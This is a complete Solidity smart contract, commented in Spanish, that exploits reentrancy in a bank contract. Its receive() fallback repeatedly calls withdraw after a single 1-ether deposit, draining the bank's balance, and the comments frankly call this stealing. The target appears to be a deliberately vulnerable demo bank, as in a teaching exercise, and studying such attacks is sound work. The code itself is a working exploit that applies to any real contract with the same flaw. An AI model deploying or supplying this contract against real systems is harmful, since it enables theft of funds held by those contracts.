// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

// Interfaz para interactuar con el banco
interface IVulnBank {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract Attacker {
    IVulnBank public bank;
    uint256 public attackAmount = 1 ether;

    // Al desplegar el contrato, le decimos dónde está el banco
    constructor(address _bankAddress) public {
        bank = IVulnBank(_bankAddress);
    }

    // ¡La trampa! Esta función se ejecuta automáticamente cuando el banco nos manda ETH
    receive() external payable {
        // Si el banco todavía tiene al menos 1 ether, le volvemos a robar
        if (address(bank).balance >= attackAmount) {
            bank.withdraw(attackAmount);
        }   
    }

    // Inicia el ataque
    function attack() external payable {
        require(msg.value >= attackAmount, "Se necesita 1 ether para iniciar");
        
        // 1. Depositamos 1 ether para engañar al banco y tener saldo inicial
        bank.deposit{value: attackAmount}();
        
        // 2. Retiramos nuestro ether, lo que desatará el bucle en nuestro receive()
        bank.withdraw(attackAmount);
    }
}